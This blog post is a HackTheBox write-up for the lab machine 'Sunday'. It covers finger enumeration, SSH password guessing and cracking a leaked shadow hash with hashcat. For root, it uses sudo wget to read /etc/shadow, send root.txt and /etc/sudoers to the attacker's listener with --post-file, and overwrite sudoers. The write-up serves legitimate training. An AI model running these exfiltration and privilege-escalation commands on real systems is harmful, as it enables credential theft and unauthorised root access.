---
layout: post
title:  "HackTheBox - Sunday Writeup"
categories: HackTheBox
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Sunday" (10.10.10.76) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

We'll start off with our usual full port nmap scan to see what kinda' stuff is running on the box, I did also run a UDP scan too like usual however again in this case nothing was running on UDP. Below you can see the output from our TCP scan and we have a rather interesting service running which I don't think we've seen before.

```
nmap -sV -sC -p- -oA fullports 10.10.10.76 --max-retries 0
Nmap scan report for 10.10.10.76
Host is up (0.038s latency).
Not shown: 64133 filtered ports, 1398 closed ports
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
58473/tcp open  rpcbind
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
```

As you can see have something running called "finger" and we can also see the box is Sun Solaris box which is based off the Linux Kernel, I believe it's actually BSD/open-BSD like but I am not totally sure. I did not know anything about Finger until now so the first thing I searched was "finger enumeration"; the first thing that came up was a page on [Pentest Monkey](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum). I prefer to download from GitHub so I can use `git clone` so I found the same tool on [Pentest Monkeys GitHub](https://github.com/pentestmonkey/finger-user-enum) page by typing "finger enumeration github"

### Finger User Enumeration

Next I started enumerating port 79/finger by using the script I mentioned above. I'd never used this tool before but it was actually pretty easy to use anyway so I won't cover how to use it, the command I run was the following `finger -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S` at first I ran without the pipe to `less` however it was spitting back a lot of very long output so I used `less -S` to clean it up and chop the long lines.

```
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
```

As you can see there are two very interesting users in the list above `sammy` and `sunny` these are more interesting than the rest because they are the only two that actually have logins, the rest do not. Interestingly, we don't see a root user though, this is odd. Because I couldn't see one in the list I ran another scan just for the username `root` to see what I could see.

``` 
finger -u "root" -t 10.10.10.76
root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
```

So we do have a root user, interestingly we see the hostname "sunday" from this we can infer the admin potentially logged in with this locally and the hostname of the device is "sunday". Given that HTB is a bit CTF like, I tried a few username/password combinations for SSH, to my surprise I got in!

### User Exploitation

No real exploitation was/is required for the user flag on this box. There are two ways of doing this however, firstly you can guess the password (like I did) or you could brute-force your way in. I opted with guessing my way in because the word "sunny sunday" was very, very obvious and that got me in over SSH. It is worth noting that when SSHing in you're going to get a key-exchange error, this is because the OS is quite old but don't worry the SSH manpages has a solution to this!

```
ssh sunny@10.10.10.76 -p 22022
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

As you can see it gives us a list of key offerings the device has, that's very helpful, I selected `diffie-hellman-group1-sha1` as the key and used the `-okexAlgorithms` flag from the SSH manpages.

```
ssh -okexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ 
```

Yay! We got a login. Now we need to work on our privilege escalation, as we saw before there is another account "sammy" so let's try and get access to that before we go for root.

### Privilege Escalation

As soon as I logged into the box I went into the top-level directory and I saw a directory called "backup" this is not a standard Linux directory so I did an `ls backup` to my surprise there were two files in this directory `agent22.backup` and `shadow.backup`, well `agent22` is the name of the user that made this box and `shadow` is well, where Linux stores passwords. Let's use `cat backup/shadow.backup` to get the contents of the file.

```
sunny@sunday:/$ cat backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Oh look, we have the hash for the user `sammy`, let's use hashcat to crack this hash and get the users password, first we need to figure out what type of hash this is, we can tell from the start of the hash `$5$` by going to the [hashcat example_hashes documentation](https://hashcat.net/wiki/doku.php?id=example_hashes)if we do a `CTRL+F` for `$5$` we can find an entry for mode 7400 which is sha256crypt and right at the end it says "Unix" this is what we want so let us load this hash into hashcat to crack.

#### Shadow Hash Cracking

As mentioned, we're going to use hashcat to crack this hash and for our wordlist we're going to use `rockyou.txt` usually because in any kind of CTF/vulnerable box if there is hash cracking involved then the password will be in rockyou. You can do the hash cracking in a vm, or if you have a hash cracking machine you can do it in that, I don't have one so I always do these inside my own host.

In order to prepare the hash all I did was copy the hash from the cat output, on my Linux host did `nano sunday` to make a file, pasted the hash in the file then saved it with `ctrl+X`, then I copied that out of my VM onto my host, put it in the hashcat directory and ran `hashcat64 -m 7400 sunday rockyou.txt` waited a minute or so it and it returned back the following `$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!` so our password is `cooldude!` let's use this to login with the username `sammy`.

### Privilege Escalation II

So as mentione, we login using the username of `sammy` and the password `cooldude1` and it works perfectly! Remember, we need to specify the key algorithm again like last time else the login won't work.

```
ssh -okexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
Password: 
Last login: Tue Apr 24 12:57:03 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ 
```

From here we can grab our `user.txt` like usual and take that flag! Let's work on root now! Next we need to figure out how we can get root, I usually follow the same process for this. 

I'm first going to see what we can run with sudo by using `sudo -l` in this case we can run one thing `wget` this is useful actually. I say that because using `wget - i` you can download from URLs that are found in a file however, we can abuse this to read a file we shouldn't be able to (as we can run this with sudo) for example - this could be used for us to read `/etc/shadow` for example, if we could do this we can attempt to crack the root password, so that's what I am going to do first all just by using `sudo wget` :D

```
sudo wget -i /etc/shadow

sammy@sunday:~/Desktop$ sudo wget -i /etc/shadow
/etc/shadow: Invalid URL root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::: Unsupported scheme
/etc/shadow: Invalid URL daemon:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL bin:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL sys:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL adm:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL lp:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL uucp:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL nuucp:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL dladm:*LK*:::::::: Unsupported scheme
/etc/shadow: Invalid URL smmsp:NP:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL listen:*LK*:::::::: Unsupported scheme
/etc/shadow: Invalid URL gdm:*LK*:::::::: Unsupported scheme
/etc/shadow: Invalid URL zfssnap:NP:::::::: Unsupported scheme
/etc/shadow: Invalid URL xvm:*LK*:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL mysql:NP:::::::: Unsupported scheme
/etc/shadow: Invalid URL openldap:*LK*:::::::: Unsupported scheme
/etc/shadow: Invalid URL webservd:*LK*:::::::: Unsupported scheme
/etc/shadow: Invalid URL postgres:NP:::::::: Unsupported scheme
/etc/shadow: Invalid URL svctag:*LK*:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL nobody:*LK*:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL noaccess:*LK*:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL nobody4:*LK*:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::: Unsupported scheme
/etc/shadow: Invalid URL sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::: Unsupported scheme
No URLs found in /etc/shadow.
```

As you can see in the above output, wget is telling us it was unable to find a URL in the file, that's fine, we could use `awk` to negate these errors but it doesn't matter, we have the root hash so let's try and crack that now!

Using the same password cracking method we did earlier, we're going to try and crack the root hash, again like before we will use hashcat for this and we'll run the following `hashcat64 -m 7400 rootsunday rockyou.txt` unfortunately I was unable to crack the root hash for this box so I had to think of another method. We know already we can use wget to get the contents of files so we can always use this to grab the root flag (which I did.) however, we still want to get a shell on the box for our learning benefit.

In order to get the root flag you can do the following `sudo wget --post-file=/root/root.txt 10.10.14.21` whilst listening to connections on port 80 using `nc -nvlp 80` on your machine.

```
nc -nvlp 80
Listening on [unknown] (family 0, port -1319828693)
Connection from 10.10.10.76 49999 received!
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.21
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

[root flag]
```

When you do this, where I have put `root flag` you will get the actual root flag, so you can use this if you don't want to get a full shell but, I didn't want to stop here and I had an idea to get root - what if we could download the `sudoers` file, edit it and then upload it back to the box in order in our case making sure our user `sammy` can do anything he likes - sounds easy, right? It is!

First we need to download it, we can do this by using the same `wget` method we used above in order to get the root flag, setup a listener on port 80 on your device and then use `sudo wget --post-file=/etc/sudoers 10.10.14.21` on the victim box this will give you the contents of the sudoers file in your listener, next copy and paste all of the contents into a file on your machine, I used nano and made `nano easysuoders`.

```
sudo wget --post-file=/etc/sudoers 10.10.14.21  
--17:00:06--  http://10.10.14.21/
           => `index.html'
Connecting to 10.10.14.21:80... connected.
HTTP request sent, awaiting response... ^C
```

```
# sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
# Failure to use 'visudo' may result in syntax or file permission errors
# that prevent sudo from running.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# Host alias specification

# User alias specification

# Cmnd alias specification

# Defaults specification

# Runas alias specification

# User privilege specification
root	ALL=(ALL) ALL

# Uncomment to allow people in group wheel to run all commands
# %wheel	ALL=(ALL) ALL

# Same thing without a password
# %wheel	ALL=(ALL) NOPASSWD: ALL

# Samples
# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
# %users  localhost=/sbin/shutdown -h now
sammy ALL=(root) NOPASSWD: ALL
sunny ALL=(root) NOPASSWD: /root/troll
```

As you can see in the above, I set it to `ALL` for the user `Sammy` this way we can sudo anything! Now all we need to do is send the sudoers file back to the box by using a HTTP server and `sudo wget` on the victim!

We setup a SimpleHTTPServer using `python -m SimpleHTTPServer 80` in the same directory as our modified sudoers file, then we go back on the victim and we type the following `sudo wget 10.10.14.21/easysudoers --output-document=sudoers` - make sure you do this in the `/etc` directory! This should replace the `sudoers` file and when you run `sudo -l` you should see the user `Sammy` has permission to execute anything as sudo!

```
sammy@sunday:/etc$ sudo wget 10.10.14.21/easysudoers --output-document=sudoers
--17:09:44--  http://10.10.14.21/easysudoers
           => `sudoers'
Connecting to 10.10.14.21:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 786 [application/octet-stream]

100%[==============================================================================================================================================================>] 786           --.--K/s             

17:09:44 (83.13 MB/s) - `sudoers' saved [786/786]

sammy@sunday:/etc$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: ALL
sammy@sunday:/etc$ sudo su
root@sunday:/etc# id
uid=0(root) gid=0(root)
root@sunday:/etc# 
```

That's it, we've done it! You now have a root shell and we've completed the box! Linux misconfigurtions are cool, right?! Haha.